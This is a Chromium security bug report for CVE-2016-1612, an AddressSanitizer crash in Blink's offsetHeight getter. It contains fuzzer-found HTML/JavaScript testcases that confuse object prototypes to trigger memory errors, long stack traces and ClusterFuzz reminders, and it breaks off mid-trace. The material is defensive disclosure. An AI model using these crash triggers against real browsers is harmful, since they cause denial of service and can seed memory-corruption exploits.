# Security: SEGV on unknown address in offsetHeightAttributeGetter

| Field | Value |
|-------|-------|
| **Issue ID** | [40082241](https://issues.chromium.org/issues/40082241) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>DOM |
| **CVE IDs** | CVE-2016-1612 |
| **Reporter** | cl...@gmail.com |
| **Assignee** | jk...@chromium.org |
| **Created** | 2015-06-08 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

This testcase crashes the latest asan build of chrome as follows:

# ASAN:SIGSEGV

==23243==ERROR: AddressSanitizer: SEGV on unknown address 0x00000092116c (pc 0x7f4f0081037f bp 0x7ffd1b5fa590 sp 0x7ffd1b5fa570 T0)  

#0 0x7f4f0081037e in operator\* /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/wtf/RawPtr.h:119:36  

#1 0x7f4f0081037e in document /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/TreeScope.h:70:0  

#2 0x7f4f0081037e in document /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Node.h:476:0  

#3 0x7f4f0081037e in blink::Element::offsetHeight() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Element.cpp:609:0  

#4 0x7f4f0473d7cc in offsetHeightAttributeGetter /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8HTMLElement.cpp:495:31  

#5 0x7f4f0473d7cc in blink::HTMLElementV8Internal::offsetHeightAttributeGetterCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8HTMLElement.cpp:501:0  

#2 0x7f4d70506927 (<unknown module>)  

#3 0x7f4d7043f607 (<unknown module>)  

#4 0x7f4d7043ed0a (<unknown module>)  

#5 0x7f4d704311bc (<unknown module>)  

#6 0x7f4d70416321 (<unknown module>)  

#6 0x7f4efda2e34f in v8::internal::Invoke(bool, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/execution.cc:128:9  

#7 0x7f4efda2c42a in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, bool) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/execution.cc:179:10  

#8 0x7f4efd731c5c in v8::Function::Call(v8::Local[v8::Context](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/api.cc:4542:11  

#9 0x7f4f03cebd91 in blink::V8ScriptRunner::callFunction(v8::Local[v8::Function](javascript:void(0);), blink::ExecutionContext\*, v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*, v8::Isolate\*) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:488:40  

#10 0x7f4f03bcbb28 in blink::ScriptController::callFunction(blink::ExecutionContext\*, v8::Local[v8::Function](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*, v8::Isolate\*) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:154:40  

#11 0x7f4f03bcb1bc in blink::ScriptController::callFunction(v8::Local[v8::Function](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:148:12  

#12 0x7f4f03cb9772 in blink::V8LazyEventListener::callListenerFunction(blink::ScriptState\*, v8::Local[v8::Value](javascript:void(0);), blink::Event\*) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8LazyEventListener.cpp:100:10  

#13 0x7f4f03c59f93 in blink::V8AbstractEventListener::invokeEventHandler(blink::ScriptState\*, blink::Event\*, v8::Local[v8::Value](javascript:void(0);)) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:125:23  

#14 0x7f4f03c59765 in blink::V8AbstractEventListener::handleEvent(blink::ScriptState\*, blink::Event\*) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:100:5  

#15 0x7f4f03c592a7 in blink::V8AbstractEventListener::handleEvent(blink::ExecutionContext\*, blink::Event\*) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:85:5  

#16 0x7f4f00b4a657 in blink::EventTarget::fireEventListeners(blink::Event\*, blink::EventTargetData\*, WTF::Vector<blink::RegisteredEventListener, 1ul, WTF::DefaultAllocator>&) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/events/EventTarget.cpp:356:9  

#17 0x7f4f00b481f4 in blink::EventTarget::fireEventListeners(blink::Event\*) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/events/EventTarget.cpp:292:9  

#18 0x7f4f01f96079 in blink::LocalDOMWindow::dispatchEvent(WTF::PassRefPtr[blink::Event](javascript:void(0);), WTF::PassRefPtr[blink::EventTarget](javascript:void(0);)) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:1402:12  

#19 0x7f4f01f92e7a in blink::LocalDOMWindow::dispatchLoadEvent() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:1374:9  

#20 0x7f4f01f94499 in dispatchWindowLoadEvent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:372:5  

#21 0x7f4f01f94499 in blink::LocalDOMWindow::documentWasClosed() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:377:0  

#22 0x7f4f00748971 in blink::Document::implicitClose() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Document.cpp:2491:9  

#23 0x7f4f024ab2a8 in blink::FrameLoader::checkCompleted() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/loader/FrameLoader.cpp:501:9  

#24 0x7f4f024aa6e9 in blink::FrameLoader::finishedParsing() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/loader/FrameLoader.cpp:419:5  

#25 0x7f4f00795840 in blink::Document::finishedParsing() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Document.cpp:4529:9  

#26 0x7f4f012ecdca in blink::HTMLTreeBuilder::finished() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLTreeBuilder.cpp:2806:5  

#27 0x7f4f0119a5b7 in end /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:853:5  

#28 0x7f4f0119a5b7 in attemptToRunDeferredScriptsAndEnd /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:866:0  

#29 0x7f4f0119a5b7 in blink::HTMLDocumentParser::prepareToStopParsing() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:272:0  

#30 0x7f4f011a525b in blink::HTMLDocumentParser::processParsedChunkFromBackgroundParser(WTF::PassOwnPtr[blink::HTMLDocumentParser::ParsedChunk](javascript:void(0);)) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:510:13  

#31 0x7f4f0119db8f in blink::HTMLDocumentParser::pumpPendingSpeculations() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:563:36  

#32 0x7f4f0119cf7c in blink::HTMLDocumentParser::resumeParsingAfterYield() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:307:5  

#33 0x7f4f0e8936e8 in blink::CancellableTaskFactory::CancellableTask::run() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/platform/scheduler/CancellableTaskFactory.cpp:29:9  

#34 0x7f4f07f2fde8 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/bind\_internal.h:157:12  

#35 0x7f4f07f2fde8 in MakeItSo /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/bind\_internal.h:293:0  

#36 0x7f4f07f2fde8 in base::internal::Invoker<base::IndexSequence<0ul>, base::internal::BindState<base::internal::RunnableAdapter<void (\*)(scoped\_ptr<blink::WebThread::Task, base::DefaultDeleter[blink::WebThread::Task](javascript:void(0);) >)>, void (scoped\_ptr<blink::WebThread::Task, base::DefaultDeleter[blink::WebThread::Task](javascript:void(0);) >), base::internal::TypeList<base::internal::PassedWrapper<scoped\_ptr<blink::WebThread::Task, base::DefaultDeleter[blink::WebThread::Task](javascript:void(0);) > > > >, base::internal::TypeList<base::internal::UnwrapTraits<base::internal::PassedWrapper<scoped\_ptr<blink::WebThread::Task, base::DefaultDeleter[blink::WebThread::Task](javascript:void(0);) > > > >, base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (\*)(scoped\_ptr<blink::WebThread::Task, base::DefaultDeleter[blink::WebThread::Task](javascript:void(0);) >)>, base::internal::TypeList<scoped\_ptr<blink::WebThread::Task, base::DefaultDeleter[blink::WebThread::Task](javascript:void(0);) > > >, void ()>::Run(base::internal::BindStateBase\*) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/bind\_internal.h:343:0  

#37 0x7f4ef9f15582 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/callback.h:396:12  

#38 0x7f4ef9f15582 in base::debug::TaskAnnotator::RunTask(char const\*, char const\*, base::PendingTask const&) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/debug/task\_annotator.cc:62:0  

#39 0x7f4f07f23396 in scheduler::TaskQueueManager::ProcessTaskFromWorkQueue(unsigned long, bool, base::PendingTask\*) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../components/scheduler/child/task\_queue\_manager.cc:674:5  

#40 0x7f4f07f1ff2a in scheduler::TaskQueueManager::DoWork(bool) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../components/scheduler/child/task\_queue\_manager.cc:627:9  

#41 0x7f4f07f2d9f0 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/bind\_internal.h:176:12  

#42 0x7f4f07f2d9f0 in MakeItSo /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/bind\_internal.h:303:0  

#43 0x7f4f07f2d9f0 in base::internal::Invoker<base::IndexSequence<0ul, 1ul>, base::internal::BindState<base::internal::RunnableAdapter<void (scheduler::TaskQueueManager::\*)(bool)>, void (scheduler::TaskQueueManager\*, bool), base::internal::TypeList<base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);), bool> >, base::internal::TypeList<base::internal::UnwrapTraits<base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);) >, base::internal::UnwrapTraits<bool> >, base::internal::InvokeHelper<true, void, base::internal::RunnableAdapter<void (scheduler::TaskQueueManager::\*)(bool)>, base::internal::TypeList<base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);) const&, bool const&> >, void ()>::Run(base::internal::BindStateBase\*) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/bind\_internal.h:343:0  

#44 0x7f4ef9f15582 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/callback.h:396:12  

#45 0x7f4ef9f15582 in base::debug::TaskAnnotator::RunTask(char const\*, char const\*, base::PendingTask const&) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/debug/task\_annotator.cc:62:0  

#46 0x7f4ef9d76047 in base::MessageLoop::RunTask(base::PendingTask const&) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_loop.cc:458:3  

#47 0x7f4ef9d782db in DeferOrRunPendingTask /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_loop.cc:468:5  

#48 0x7f4ef9d782db in base::MessageLoop::DoWork() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_loop.cc:580:0  

#49 0x7f4ef9d8208e in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_pump\_default.cc:34:21  

#50 0x7f4ef9dc429e in base::RunLoop::Run() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/run\_loop.cc:55:3  

#51 0x7f4ef9d73748 in base::MessageLoop::Run() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_loop.cc:286:3  

#52 0x7f4f080a43b2 in content::RendererMain(content::MainFunctionParams const&) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/renderer/renderer\_main.cc:220:7  

#53 0x7f4ef9c04ee8 in content::RunZygote(content::MainFunctionParams const&, content::ContentMainDelegate\*) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/app/content\_main\_runner.cc:312:14  

#54 0x7f4ef9c067a4 in content::RunNamedProcessTypeMain(std::\_\_1::basic\_string<char, std::\_\_1::char\_traits<char>, std::\_\_1::allocator<char> > const&, content::MainFunctionParams const&, content::ContentMainDelegate\*) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/app/content\_main\_runner.cc:396:12  

#55 0x7f4ef9c087ea in content::ContentMainRunnerImpl::Run() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/app/content\_main\_runner.cc:801:12  

#56 0x7f4ef9c03eab in content::ContentMain(content::ContentMainParams const&) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/app/content\_main.cc:19:15  

#57 0x7f4ef85e97ef in ChromeMain /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../chrome/app/chrome\_main.cc:66:12  

#58 0x7f4eedd3aa3f in \_\_libc\_start\_main /build/buildd/glibc-2.21/csu/libc-start.c:289:0

AddressSanitizer can not provide additional info.  

SUMMARY: AddressSanitizer: SEGV (/home/nils/MonkeyChrome/asan-linux-release-333230/chrome+0xa8d537e)  

==23243==ABORTING

**VERSION**  

Chrome Version: asan-linux-release-333230  

Operating System: Linux

**REPRODUCTION CASE**

<script>
function start() {
objs = new Array();
objs[0]=document.createElement('iframe');
objs[1]=document.body;
objs[2]=document.createElement('rt');
objs[24]=(new DOMParser).parseFromString('\*\*\*\* ', 'text/html');
objs[25]=document.documentElement;
objs[119]=document.createElement('input');
objs[120]=new Promise(f=function(){}).then(f);
objs[150]=document.createElement('input');
objs[120].\_\_proto\_\_=objs[150].\_\_proto\_\_;
try{for(var x=0; x<254; x++) if(objs[x]) objs[x].offsetHeight;}catch(e){}
for(var x=0; x<285; x++) if(objs[x]) objs[x].offsetHeight;
}
</script>
<body onload="start()"></body>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

## Attachments

- [cr497632-min.html](attachments/cr497632-min.html) (text/html, 413 B)
- [cr497632-min.html](attachments/cr497632-min_53161974.html) (text/html, 309 B)

## Timeline

### cl...@chromium.org (2015-06-08)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5274306815197184

Uploader: ochang@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: UNKNOWN
Crash Address: 0x00000092116c
Crash State:
  blink::Element::offsetHeight
  blink::HTMLElementV8Internal::offsetHeightAttributeGetterCallback
  v8::internal::Invoke
  

Unminimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv96WmV3cGUowRA0b0RUqMUb1L8STXzFDkVVrKipl0uMzTZsZ_cXqOHDLCysSWMjvC0PpNPcKr7l9AyHolAjECSRT35uiUTjG1JZc6jgm3kBfPZOaV2E74xw4t_LxBhm-NGsofCMI68Pg7H1srqV-3mnum26ZAQ


Filer: ochang

### oc...@chromium.org (2015-06-08)

Thanks for the report.

jochen@, could you please take a look or assign to someone suitable? 

### oc...@chromium.org (2015-06-08)

oops, fixing owner and status.

### cl...@chromium.org (2015-06-08)

[Empty comment from Monorail migration]

### jo...@chromium.org (2015-06-09)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-06-29)

haraken@: Uh oh! This issue is still open and hasn't been updated in the last 21 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2015-07-10)

[Empty comment from Monorail migration]

### ha...@google.com (2015-07-15)

Looks more like a general Blink bug

### cl...@chromium.org (2015-07-21)

haraken@: Uh oh! This issue is still open and hasn't been updated in the last 42 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2015-08-11)

haraken@: Uh oh! This issue is still open and hasn't been updated in the last 63 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2015-08-21)

[Empty comment from Monorail migration]

### ha...@chromium.org (2015-08-24)

Does this bug still reproduce?

I cannot reproduce it in Linux+Asan+Debug with Blink r201044.


### cl...@chromium.org (2015-09-14)

haraken@: Uh oh! This issue is still open and hasn't been updated in the last 21 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2015-10-02)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-10-05)

haraken@: Uh oh! This issue is still open and hasn't been updated in the last 42 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2015-10-27)

haraken@: Uh oh! This issue is still open and hasn't been updated in the last 63 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2015-11-13)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-11-17)

haraken@: Uh oh! This issue is still open and hasn't been updated in the last 85 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@gmail.com (2015-11-18)

I am still getting a lot of crashes related to offsetHeightAttributeGetter while fuzzing. The following testcase as an example:

<script>
function start() {
        o = [];
        try{o[179]=new Blob([undefined], {'type': 'text/html'})}catch(e){};undefined;
        try{o[215]=o[179]['__proto__']}catch(e){};undefined;
        try{o[263]=document.createElementNS('http://www.w3.org/1999/xhtml','form')}catch(e){};undefined;
        try{o[215]['__proto__']=o[263]}catch(e){};undefined;
        try{o[459]=new Blob([undefined], {'type': 'audio/x-wav'})}catch(e){};undefined;
        try{o[604]=document.createElementNS('http://www.w3.org/1999/xhtml','input')}catch(e){};undefined;
        try{o[621]=new Blob([undefined], {'type': 'audio/x-wav'})}catch(e){};undefined;
        try{o[689]=new Blob([undefined], {'type': 'audio/x-wav'})}catch(e){};undefined;
        try{o[604].__proto__=o[459].__proto__}catch(e){};undefined;
        delete o[179];
        delete o[215];
        delete o[263];
        try{for(var x=0;x<708;x++) try{o[x].offsetHeight}catch(a){}}catch(e){};undefined;
}

start()
</script>

Crashes as follows:

=================================================================
==9520==ERROR: AddressSanitizer: use-after-poison on address 0x7efe70d819b8 at pc 0x555d4a326438 bp 0x7ffc14850810 sp 0x7ffc14850808
READ of size 8 at 0x7efe70d819b8 thread T0 (chrome)
    #0 0x555d4a326437 in operator* third_party/WebKit/Source/wtf/RawPtr.h:118:36
    #1 0x555d4a326437 in treeScope third_party/WebKit/Source/core/dom/Node.h:468
    #2 0x555d4a326437 in document third_party/WebKit/Source/core/dom/Node.h:462
    #3 0x555d4a326437 in blink::Element::offsetHeight() third_party/WebKit/Source/core/dom/Element.cpp:682
    #4 0x555d4dfff38c in offsetHeightAttributeGetter /mnt/data/b/build/slave/ASAN_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8HTMLElement.cpp:537:31
    #5 0x555d4dfff38c in blink::HTMLElementV8Internal::offsetHeightAttributeGetterCallback(v8::FunctionCallbackInfo<v8::Value> const&) /mnt/data/b/build/slave/ASAN_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8HTMLElement.cpp:543
    #6 0x7f3bc24081c7  (<unknown module>)
    #7 0x7f3bc2344f0e  (<unknown module>)
    #8 0x7f3bc23440b7  (<unknown module>)
    #9 0x7f3bc2337163  (<unknown module>)
    #10 0x7f3bc231a8e1  (<unknown module>)
    #11 0x555d46fb086f in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, bool, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*, v8::internal::Handle<v8::internal::Object>) v8/src/execution.cc:98:13
    #12 0x555d46faeffd in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*) v8/src/execution.cc:167:10
    #13 0x555d4692336e in v8::Script::Run(v8::Local<v8::Context>) v8/src/api.cc:1724:23
    #14 0x555d4d7783df in blink::V8ScriptRunner::runCompiledScript(v8::Isolate*, v8::Local<v8::Script>, blink::ExecutionContext*) third_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:393:18
    #15 0x555d4d666c57 in blink::ScriptController::executeScriptAndReturnValue(v8::Local<v8::Context>, blink::ScriptSourceCode const&, blink::AccessControlStatus, double*) third_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:190:21
    #16 0x555d4d6727b9 in blink::ScriptController::evaluateScriptInMainWorld(blink::ScriptSourceCode const&, blink::AccessControlStatus, blink::ScriptController::ExecuteScriptPolicy, double*) third_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:566:35
    #17 0x555d4d67360e in blink::ScriptController::executeScriptInMainWorld(blink::ScriptSourceCode const&, blink::AccessControlStatus, double*) third_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:539:5
    #18 0x555d4a7280fc in blink::ScriptLoader::executeScript(blink::ScriptSourceCode const&, double*) third_party/WebKit/Source/core/dom/ScriptLoader.cpp:403:5
    #19 0x555d4a719bd0 in blink::ScriptLoader::prepareScript(WTF::TextPosition const&, blink::ScriptLoader::LegacyTypeSupport) third_party/WebKit/Source/core/dom/ScriptLoader.cpp:272:14
    #20 0x555d4abc779e in blink::HTMLScriptRunner::runScript(blink::Element*, WTF::TextPosition const&) third_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:353:9
    #21 0x555d4abc6dea in blink::HTMLScriptRunner::execute(WTF::PassRefPtr<blink::Element>, WTF::TextPosition const&) third_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:215:5
    #22 0x555d4ab6b84b in blink::HTMLDocumentParser::runScriptsForPausedTreeBuilder() third_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:330:9
    #23 0x555d4ab71d72 in blink::HTMLDocumentParser::processParsedChunkFromBackgroundParser(WTF::PassOwnPtr<blink::HTMLDocumentParser::ParsedChunk>) third_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:525:13
    #24 0x555d4ab6a3fb in blink::HTMLDocumentParser::pumpPendingSpeculations() third_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:586:36
    #25 0x555d4ab69823 in blink::HTMLDocumentParser::resumeParsingAfterYield() third_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:319:5
    #26 0x555d581ffde4 in blink::CancellableTaskFactory::CancellableTask::run() third_party/WebKit/Source/platform/scheduler/CancellableTaskFactory.cpp:29:9
    #27 0x555d51533950 in Run base/bind_internal.h:157:12
    #28 0x555d51533950 in MakeItSo base/bind_internal.h:293
    #29 0x555d51533950 in base::internal::Invoker<base::IndexSequence<0ul>, base::internal::BindState<base::internal::RunnableAdapter<void (*)(scoped_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter<blink::WebTaskRunner::Task> >)>, void (scoped_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter<blink::WebTaskRunner::Task> >), base::internal::TypeList<base::internal::PassedWrapper<scoped_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter<blink::WebTaskRunner::Task> > > > >, base::internal::TypeList<base::internal::UnwrapTraits<base::internal::PassedWrapper<scoped_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter<blink::WebTaskRunner::Task> > > > >, base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (*)(scoped_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter<blink::WebTaskRunner::Task> >)>, base::internal::TypeList<scoped_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter<blink::WebTaskRunner::Task> > > >, void ()>::Run(base::internal::BindStateBase*) base/bind_internal.h:343
    #30 0x555d4222f67d in Run base/callback.h:396:12
    #31 0x555d4222f67d in base::debug::TaskAnnotator::RunTask(char const*, base::PendingTask const&) base/debug/task_annotator.cc:51
    #32 0x555d51555ab1 in scheduler::TaskQueueManager::ProcessTaskFromWorkQueue(scheduler::internal::TaskQueueImpl*, scheduler::internal::TaskQueueImpl::Task*) components/scheduler/base/task_queue_manager.cc:357:3
    #33 0x555d5154e222 in scheduler::TaskQueueManager::DoWork(bool) components/scheduler/base/task_queue_manager.cc:282:13
    #34 0x555d51558db0 in Run base/bind_internal.h:176:12
    #35 0x555d51558db0 in MakeItSo base/bind_internal.h:303
    #36 0x555d51558db0 in base::internal::Invoker<base::IndexSequence<0ul, 1ul>, base::internal::BindState<base::internal::RunnableAdapter<void (scheduler::TaskQueueManager::*)(bool)>, void (scheduler::TaskQueueManager*, bool), base::internal::TypeList<base::WeakPtr<scheduler::TaskQueueManager>, bool> >, base::internal::TypeList<base::internal::UnwrapTraits<base::WeakPtr<scheduler::TaskQueueManager> >, base::internal::UnwrapTraits<bool> >, base::internal::InvokeHelper<true, void, base::internal::RunnableAdapter<void (scheduler::TaskQueueManager::*)(bool)>, base::internal::TypeList<base::WeakPtr<scheduler::TaskQueueManager> const&, bool const&> >, void ()>::Run(base::internal::BindStateBase*) base/bind_internal.h:343
    #37 0x555d4222f67d in Run base/callback.h:396:12
    #38 0x555d4222f67d in base::debug::TaskAnnotator::RunTask(char const*, base::PendingTask const&) base/debug/task_annotator.cc:51
    #39 0x555d42083d00 in base::MessageLoop::RunTask(base::PendingTask const&) base/message_loop/message_loop.cc:481:3
    #40 0x555d42085cdb in DeferOrRunPendingTask base/message_loop/message_loop.cc:490:5
    #41 0x555d42085cdb in base::MessageLoop::DoWork() base/message_loop/message_loop.cc:602
